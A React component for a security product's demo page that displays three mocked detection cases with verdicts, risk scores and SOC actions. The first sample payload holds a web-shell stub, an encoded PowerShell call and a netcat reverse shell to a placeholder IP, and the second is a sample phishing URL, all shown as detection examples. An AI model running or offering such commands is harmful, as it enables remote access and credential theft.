import React, { useState } from "react";
import {
  Activity,
  AlertTriangle,
  ArrowRight,
  CheckCircle2,
  Code2,
  Cpu,
  Fingerprint,
  Layers,
  Play,
  Radio,
  ShieldAlert,
  ShieldCheck,
  Terminal,
} from "lucide-react";
import { SeverityBadge } from "./SeverityBadge";
import { StatusBadge } from "./StatusBadge";

interface SampleCase {
  id: string;
  name: string;
  type: string;
  payload: string;
  verdict: "malicious" | "suspicious" | "benign";
  severity: "critical" | "high" | "medium" | "low" | "info";
  riskScore: number;
  confidence: number;
  reasons: string[];
  recommendations: string[];
  indicators: Array<{ type: string; value: string }>;
}

const SAMPLE_CASES: SampleCase[] = [
  {
    id: "case-1",
    name: "Web Shell & Command Injection",
    type: "text",
    payload: "eval(base64_decode('...')); cmd.exe /c powershell -enc JABzACAAPQ... nc -e /bin/sh 198.51.100.1 4444",
    verdict: "malicious",
    severity: "critical",
    riskScore: 94.5,
    confidence: 0.98,
    reasons: [
      "Rule match: Web Shell & Command Injection Signatures (RULE-MOCK-001)",
      "ML Model detected suspicious RCE keywords with 95% confidence",
      "Threat intel correlated observable '198.51.100.1' with active C2 infrastructure",
    ],
    recommendations: [
      "Isolate affected endpoint immediately from local network segment.",
      "Block outbound connections to 198.51.100.1 at perimeter firewall.",
      "Initiate memory acquisition and escalate to Incident Response.",
    ],
    indicators: [
      { type: "ip_address", value: "198.51.100.1" },
      { type: "file_hash", value: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" },
    ],
  },
  {
    id: "case-2",
    name: "Targeted Credential Harvesting Link",
    type: "url",
    payload: "https://secure-login-update-verify.com/login.php?user=executive",
    verdict: "malicious",
    severity: "high",
    riskScore: 82.0,
    confidence: 0.92,
    reasons: [
      "Rule match: Phishing & Credential Harvester Keywords (RULE-MOCK-002)",
      "Threat intel feed 'MockThreatIntel' identified domain as known phishing site",
      "High similarity to executive login spoofing templates",
    ],
    recommendations: [
      "Add secure-login-update-verify.com to corporate DNS blocklist.",
      "Purge inbound emails containing this URL across mailboxes.",
    ],
    indicators: [
      { type: "domain", value: "secure-login-update-verify.com" },
      { type: "url", value: "https://secure-login-update-verify.com/login.php" },
    ],
  },
  {
    id: "case-3",
    name: "Benign System Health Telemetry",
    type: "json",
    payload: '{"service": "auth-gateway", "status": "ok", "latency_ms": 1.4, "timestamp": "2026-09-11T12:00:00Z"}',
    verdict: "benign",
    severity: "info",
    riskScore: 4.0,
    confidence: 0.99,
    reasons: [
      "No malicious rules or attack patterns matched",
      "ML model evaluated payload as 99% benign standard operational traffic",
      "No threat intel hits on associated metadata",
    ],
    recommendations: [
      "No containment required.",
      "Retain log in operational baseline.",
    ],
    indicators: [],
  },
];

export const InteractiveConsolePreview: React.FC = () => {
  const [selectedCase, setSelectedCase] = useState<SampleCase>(SAMPLE_CASES[0]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [activeTab, setActiveTab] = useState<"findings" | "signals" | "indicators">("findings");

  const handleSelectCase = (c: SampleCase) => {
    setIsExecuting(true);
    setSelectedCase(c);
    setTimeout(() => {
      setIsExecuting(false);
    }, 400);
  };

  return (
    <section id="preview" className="py-16">
      <div className="max-w-7xl mx-auto px-6 space-y-6">
        {/* Section Title */}
        <div className="text-center space-y-2 max-w-2xl mx-auto">
          <div className="text-xs font-mono font-bold uppercase tracking-wider text-primary">
            LIVE ENGINE DEMONSTRATION
          </div>
          <h2 className="text-2xl sm:text-3xl font-extrabold text-foreground tracking-tight">
            Interactive Analysis & Risk Scoring
          </h2>
          <p className="text-xs sm:text-sm text-muted-foreground">
            Test sample payloads against the actual 5-stage detection and multi-source risk fusion pipeline.
          </p>
        </div>

        {/* Console Container */}
        <div className="glass-panel rounded-2xl border border-border/80 shadow-2xl overflow-hidden">
          {/* Top terminal bar */}
          <div className="px-6 py-3.5 bg-card/90 border-b border-border/60 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-3 h-3 rounded-full bg-red-500/80" />
              <div className="w-3 h-3 rounded-full bg-yellow-500/80" />
              <div className="w-3 h-3 rounded-full bg-green-500/80" />
              <span className="ml-3 text-xs font-mono text-muted-foreground">
                SOC_ORCHESTRATOR_V1.0 // PIPELINE_INSPECTOR
              </span>
            </div>
            <div className="flex items-center gap-2 text-xs font-mono text-emerald-400">
              <Radio className="w-3.5 h-3.5 animate-pulse" />
              ENGINE ACTIVE
            </div>
          </div>

          {/* Sample Selectors */}
          <div className="p-4 bg-muted/20 border-b border-border/40 flex flex-wrap items-center gap-3">
            <span className="text-xs font-semibold text-muted-foreground uppercase font-mono mr-1">
              Select Sample:
            </span>
            {SAMPLE_CASES.map((c) => (
              <button
                key={c.id}
                onClick={() => handleSelectCase(c)}
                className={`px-3.5 py-1.5 rounded-lg text-xs font-mono font-semibold transition border ${
                  selectedCase.id === c.id
                    ? "bg-primary/20 text-primary border-primary/50 shadow-sm"
                    : "bg-card/60 text-muted-foreground hover:text-foreground border-border/60 hover:bg-muted"
                }`}
              >
                {c.name}
              </button>
            ))}
          </div>

          {/* Console Body */}
          <div className="p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Input Payload View (5 cols) */}
            <div className="lg:col-span-5 space-y-4">
              <div>
                <div className="flex items-center justify-between text-xs font-mono text-muted-foreground uppercase mb-1.5">
                  <span>Ingested Payload Preview</span>
                  <span className="text-[10px] bg-muted px-2 py-0.5 rounded border border-border">
                    {selectedCase.type}
                  </span>
                </div>
                <div className="p-4 rounded-xl bg-muted/30 border border-border/60 font-mono text-xs text-foreground overflow-x-auto min-h-[140px] whitespace-pre-wrap leading-relaxed">
                  {selectedCase.payload}
                </div>
              </div>

              {/* Ingestion Specs */}
              <div className="p-4 rounded-xl bg-card/40 border border-border/60 space-y-2 font-mono text-xs">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Orchestrator:</span>
                  <span className="text-foreground">AnalysisOrchestrator</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Idempotency Check:</span>
                  <span className="text-emerald-400">SHA-256 Pass</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Queue Mode:</span>
                  <span className="text-foreground">Redis RQ / EventStream</span>
                </div>
              </div>
            </div>

            {/* Pipeline Output & Evaluation (7 cols) */}
            <div className="lg:col-span-7 space-y-4">
              {isExecuting ? (
                <div className="h-64 flex flex-col items-center justify-center font-mono text-xs text-muted-foreground space-y-2">
                  <Activity className="w-6 h-6 animate-spin text-primary" />
                  <span>Executing Rule Engine, ML Model & Threat Intel Feeds...</span>
                </div>
              ) : (
                <>
                  {/* Verdict & Score Hero Card */}
                  <div className="p-5 rounded-xl bg-card border border-border/70 flex items-center justify-between gap-4">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span
                          className={`text-xl font-black uppercase font-mono ${
                            selectedCase.verdict === "malicious"
                              ? "text-red-400"
                              : selectedCase.verdict === "suspicious"
                              ? "text-yellow-400"
                              : "text-emerald-400"
                          }`}
                        >
                          {selectedCase.verdict} VERDICT
                        </span>
                        <SeverityBadge severity={selectedCase.severity} />
                      </div>
                      <p className="text-xs text-muted-foreground font-mono">
                        Multi-Source Confidence: {(selectedCase.confidence * 100).toFixed(0)}%
                      </p>
                    </div>

                    <div className="text-right font-mono">
                      <div className="text-[10px] text-muted-foreground uppercase">Risk Score</div>
                      <div className="text-3xl font-black text-foreground">
                        {selectedCase.riskScore.toFixed(1)}
                        <span className="text-xs text-muted-foreground font-normal">/100</span>
                      </div>
                    </div>
                  </div>

                  {/* Tabs */}
                  <div className="flex items-center gap-2 border-b border-border/50 pb-px">
                    <button
                      onClick={() => setActiveTab("findings")}
                      className={`px-3 py-1.5 text-xs font-mono font-semibold rounded-t transition border-b-2 ${
                        activeTab === "findings"
                          ? "border-primary text-primary bg-primary/5"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      Reasons ({selectedCase.reasons.length})
                    </button>
                    <button
                      onClick={() => setActiveTab("signals")}
                      className={`px-3 py-1.5 text-xs font-mono font-semibold rounded-t transition border-b-2 ${
                        activeTab === "signals"
                          ? "border-primary text-primary bg-primary/5"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      SOC Actions ({selectedCase.recommendations.length})
                    </button>
                    <button
                      onClick={() => setActiveTab("indicators")}
                      className={`px-3 py-1.5 text-xs font-mono font-semibold rounded-t transition border-b-2 ${
                        activeTab === "indicators"
                          ? "border-primary text-primary bg-primary/5"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      IoCs ({selectedCase.indicators.length})
                    </button>
                  </div>

                  {/* Tab Content */}
                  <div className="min-h-36">
                    {activeTab === "findings" && (
                      <ul className="space-y-2">
                        {selectedCase.reasons.map((r, i) => (
                          <li
                            key={i}
                            className="p-2.5 rounded-lg bg-muted/20 border border-border/40 text-xs text-foreground flex items-start gap-2.5 font-sans"
                          >
                            <span className="w-1.5 h-1.5 rounded-full bg-primary mt-1.5 shrink-0" />
                            <span>{r}</span>
                          </li>
                        ))}
                      </ul>
                    )}

                    {activeTab === "signals" && (
                      <ul className="space-y-2">
                        {selectedCase.recommendations.map((rec, i) => (
                          <li
                            key={i}
                            className="p-2.5 rounded-lg bg-muted/20 border border-border/40 text-xs text-foreground flex items-center gap-2.5 font-sans"
                          >
                            <span className="w-5 h-5 rounded-full bg-primary/20 text-primary text-[10px] font-mono font-bold flex items-center justify-center shrink-0">
                              {i + 1}
                            </span>
                            <span>{rec}</span>
                          </li>
                        ))}
                      </ul>
                    )}

                    {activeTab === "indicators" && (
                      <div className="space-y-2">
                        {selectedCase.indicators.length ? (
                          selectedCase.indicators.map((ind, i) => (
                            <div
                              key={i}
                              className="p-2.5 rounded-lg bg-muted/20 border border-border/40 text-xs font-mono flex items-center justify-between"
                            >
                              <span className="text-muted-foreground uppercase text-[10px] bg-muted px-2 py-0.5 rounded">
                                {ind.type}
                              </span>
                              <span className="text-foreground font-semibold">{ind.value}</span>
                            </div>
                          ))
                        ) : (
                          <div className="text-xs text-muted-foreground font-sans py-4 text-center">
                            No external threat observables extracted.
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
